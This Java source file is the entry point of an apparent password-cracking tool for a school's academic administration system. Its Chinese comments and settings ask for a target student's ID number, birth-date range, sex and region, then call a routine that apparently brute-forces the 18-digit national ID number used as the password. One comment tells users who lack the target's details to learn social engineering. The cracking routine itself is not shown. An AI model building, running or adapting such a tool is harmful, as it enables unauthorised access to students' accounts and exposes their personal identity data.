package com.venk.ufpasspos;


/**
 * @Description: Main程序(运行入口，更改破解所需的信息，然后点击执行！)
 * @author: Venk007
 * @date: 2015年12月4日下午4:46:05 
 * TIPS1: 文件Resource编码格式设置为"UTF-8" 
 * TIPS2: Run/Debug Settings下Common编码格式设置为"GB2312"，否则将无法运行(或者运行无结果)
 * 		    请感谢教务系统开发人员选择了fan伟ren大lei的GB2312编码
 * TIPS3: 没法搞定所需的必填信息，请先自学Social Engineering
 * TIPS4: 仅支持破解身份证号码为18位
 * TIPS5: 运行速度取决于网速
 */

public class App extends Thread {

	public static void main(String[] args) {

		// 学号(必填)
		String schoolId = "1201234567";

		// 生日(必填，请尽可能的精确范围)
		// end的日期必须在start日期之后，如果确定生日日期，则可以相同
		final int startYear = 1993;
		final int startMonth = 01;
		final int startDay = 01;

		final int endYear = 1996;
		final int endMonth = 12;
		final int endDay = 31;

		// 性别(填写"男"或"女"，加快一倍破解速度，建议填写)
		String sex = "男";
		
		/**
		 * 填写身份证的省市信息(可参考LocalId，为加快破解，建议精确到城市，两项都可以不填)
		 * 直辖市同样写在province，对应的city填写直辖市下属的区、县、或市.
		 * 盟、自治州等请填写二级名称，详情见LocalId类
		 */
		String province = "XX省";
		String city = "XX市";
			
		long startTime = System.currentTimeMillis();
		
		PassPos.passPos(schoolId, startYear, startMonth, startDay, endYear,
				endMonth, endDay, sex, province, city);
		
		long endTime = System.currentTimeMillis();
		System.out.println("Total Time: " + (endTime - startTime)/1000 + "s");

	}
}